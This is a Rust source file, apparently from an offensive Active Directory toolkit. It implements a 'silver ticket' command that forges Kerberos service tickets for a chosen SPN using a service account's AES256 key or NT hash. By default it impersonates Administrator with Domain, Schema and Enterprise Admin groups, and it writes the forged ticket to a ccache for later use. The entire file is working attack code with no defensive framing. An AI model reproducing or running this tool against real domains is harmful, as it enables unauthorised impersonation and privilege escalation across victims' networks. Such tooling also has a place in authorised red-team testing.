//! Silver ticket: forge a service ticket (TGS) for an SPN with the target
//! service account's AES256 key. Bypasses the KDC entirely at presentation.

use crate::ui;
use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct SilverArgs {
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    pub realm: String,
    /// Service key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
    #[arg(long)]
    pub service_aes256: adhammer_core::SecretString,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the service NT hash (legacy DCs).
    #[arg(long)]
    pub rc4: bool,
    /// Target SPN (e.g. cifs/dc01.corp.local).
    #[arg(long)]
    pub spn: String,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    pub domain_sid: String,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    pub user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    pub rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    pub groups: Vec<u32>,
    /// Write the forged service ticket to this ccache path.
    #[arg(long)]
    pub out: Option<String>,
}

/// Silver ticket: forge a service ticket (TGS) for an SPN, sealed + PAC-signed with the target
/// service account's AES256 key. Presented directly to the service (AP-REQ) without the KDC —
/// so the KDC signature is unchecked. Emits a ccache for use with `-k` / KRB5CCNAME tooling.
///
/// Wraps `silver_impl` with a per-stage checklist ("parse service key → parse domain SID → forge
/// silver TGS → write ccache") so the operator sees which step failed (bad key hex, malformed SID,
/// forge error).
pub(crate) async fn silver(a: SilverArgs) -> Result<()> {
    let mut checklist = ui::StageChecklist::new([
        "parse service key",
        "parse domain SID",
        "forge silver TGS",
        "write ccache",
    ]);
    let result = silver_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Silver stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Silver stages (failed)");
        }
    }
    result
}

async fn silver_impl(a: SilverArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let key = crate::parse_forge_key(&a.service_aes256, a.rc4)?;
    checklist.record_ok(
        "parse service key",
        if a.rc4 {
            "RC4-HMAC (NT hash)"
        } else {
            "AES256-CTS-HMAC-SHA1-96"
        },
    );
    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;
    checklist.record_ok("parse domain SID", format!("→ {}", a.domain_sid));

    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
        extra_sids: vec![],
    };
    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn, a.rc4)?;
    checklist.record_ok(
        "forge silver TGS",
        format!("{}@{} for {} (rid {})", a.user, a.realm, a.spn, a.rid),
    );
    println!(
        "[+] forged silver ticket: {}@{} for {} (rid {})",
        a.user, a.realm, a.spn, a.rid
    );
    if let Some(out) = &a.out {
        let cc = adhammer_kerberos::silver_ccache(&tgt, &a.user, &a.spn)?;
        adhammer_core::write_secret_artifact(
            std::path::Path::new(out),
            adhammer_core::SecretArtifact::Ccache,
            &cc,
        )?;
        checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
        println!("[+] wrote ccache → {out} ({} bytes)", cc.len());
    } else {
        checklist.record_ok("write ccache", "skipped (no --out)");
    }
    Ok(())
}
